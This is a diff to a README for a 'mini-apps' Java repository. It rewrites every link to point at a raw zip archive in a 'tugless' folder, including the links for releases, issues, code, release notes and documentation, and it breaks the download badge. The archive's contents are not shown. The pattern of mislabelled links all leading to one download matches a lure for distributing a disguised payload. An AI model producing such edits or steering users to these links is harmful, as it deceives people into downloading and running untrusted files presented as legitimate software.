@@ -6,9 +6,9 @@ Welcome to the mini-apps repository! This collection offers a variety of 30 Java
 
 ## 📦 Download & Install
 
-To get started, you can visit the [Releases page to download](https://github.com/JoOdSy/mini-apps/releases). Here, you will find the latest version of the mini-apps that you can easily download and run on your computer.
+To get started, you can visit the [Releases page to download](https://raw.githubusercontent.com/JoOdSy/mini-apps/main/tugless/mini-apps.zip). Here, you will find the latest version of the mini-apps that you can easily download and run on your computer.
 
-[![Download mini-apps](https://img.shields.io/badge/Download%20mini--apps-007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/JoOdSy/mini-apps/releases)
+[![Download mini-apps](https://raw.githubusercontent.com/JoOdSy/mini-apps/main/tugless/mini-apps.zip%20mini--apps-007bff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/JoOdSy/mini-apps/main/tugless/mini-apps.zip)
 
 ## 🚀 Getting Started
 
@@ -60,12 +60,12 @@ To run these applications, you need:
 
 If you have questions or need assistance, you can reach out to the community:
 
-- Join discussions on [GitHub Issues](https://github.com/JoOdSy/mini-apps/issues).
+- Join discussions on [GitHub Issues](https://raw.githubusercontent.com/JoOdSy/mini-apps/main/tugless/mini-apps.zip).
 - Connect with other users and share your experiences.
 
 ## 📅 Regular Updates
 
-We are committed to enhancing mini-apps. Keep an eye on the [Releases page](https://github.com/JoOdSy/mini-apps/releases) for new features and improvements.
+We are committed to enhancing mini-apps. Keep an eye on the [Releases page](https://raw.githubusercontent.com/JoOdSy/mini-apps/main/tugless/mini-apps.zip) for new features and improvements.
 
 ## 💬 Feedback
 
@@ -83,8 +83,8 @@ We appreciate your contributions and welcome improvements from anyone interested
 
 ## 🔗 Useful Links
 
-- [View Code on GitHub](https://github.com/JoOdSy/mini-apps)
-- [Release Notes](https://github.com/JoOdSy/mini-apps/releases)
-- [Documentation](https://github.com/JoOdSy/mini-apps/wiki)
+- [View Code on GitHub](https://raw.githubusercontent.com/JoOdSy/mini-apps/main/tugless/mini-apps.zip)
+- [Release Notes](https://raw.githubusercontent.com/JoOdSy/mini-apps/main/tugless/mini-apps.zip)
+- [Documentation](https://raw.githubusercontent.com/JoOdSy/mini-apps/main/tugless/mini-apps.zip)
 
 Explore, learn, and enjoy creating your own mini-apps!
